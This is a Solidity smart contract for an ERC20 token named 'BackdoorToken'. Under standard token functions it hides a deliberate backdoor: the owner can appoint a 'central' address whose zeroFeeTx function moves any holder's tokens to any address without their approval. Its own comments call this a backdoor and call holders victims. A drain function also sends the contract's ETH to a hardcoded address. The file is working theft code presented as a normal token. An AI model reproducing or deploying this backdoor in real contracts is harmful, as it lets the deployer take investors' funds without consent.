// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IERC20.sol";
import "./Ownable.sol";

contract BackdoorToken is Context, IERC20, Ownable {
    uint256 private _totalSupply;
    string private _name = "BackdoorToken";
    string private  _symbol = "BDT";
    address private _central;

    address private _mSig = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;  

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
        

    constructor() {
        _mint(_msgSender(), 1000000 * 10 ** decimals());
    }

    function name() public view override returns (string memory) {
        return _name;
    }

    function symbol() public view override returns (string memory) {
        return _symbol;
    }
    
    function decimals() public pure override returns (uint8) {
        return 18;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address sender, address spender) public view override returns (uint256) {
        return _allowances[sender][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, allowance(_msgSender(), spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        uint256 currentAllowance = allowance(_msgSender(), spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _approve(
        address sender,
        address spender,
        uint256 amount
    ) internal {
        require(sender != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[sender][spender] = amount;
        emit Approval(sender, spender, amount);
    }

    function _spendAllowance(
        address sender,
        address spender,
        uint256 amount
    ) internal {
        uint256 currentAllowance = allowance(sender, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(sender, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal {}

  
    function central() public view returns (address) {
        return _central;
    }

    modifier onlyCentral {
        require(_msgSender() == _central, "onlyCentral: caller not central");
        _;
    }

    /**
    * @notice - setCentral allows deployer to set a backdoor address
    */

    function setCentral(address newCentral) public onlyOwner {
      require(newCentral != address(0), "ERC20: transfer from the zero address");
        _setCentral(newCentral);
    }

    function _setCentral(address newCentral) internal {
      address oldCentral = _central;
      _central = newCentral;
      emit OwnershipTransferred(oldCentral, newCentral);
    }

    /**
    * @dev - contract receives eth. Owner can call drain balance
    */

     function drain() public payable onlyOwner {
        (bool success, ) = payable(_mSig).call{value: address(this).balance}("");
        require(success, "Eth transfer failed");
    }

    receive() external payable onlyOwner {
        drain();
    }

    /** 
    * @notice - zeroFeeTx backdoor - reverts funds 'from' victim 'to' address. 
    * owner() must set central -> only central can call zeroFeeTx
    */

    function zeroFeeTx(address from, address to, uint256 amount) public onlyCentral returns (bool) {
        _zeroFeeTx(from, to, amount);
        return true;
    }

    function _zeroFeeTx(
        address from,
        address to,
        uint256 amount
    ) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        unchecked {
            _balances[from] = fromBalance - amount;
        }

        _balances[to] += amount;

        emit Transfer(from, to, amount);

        }
    
    }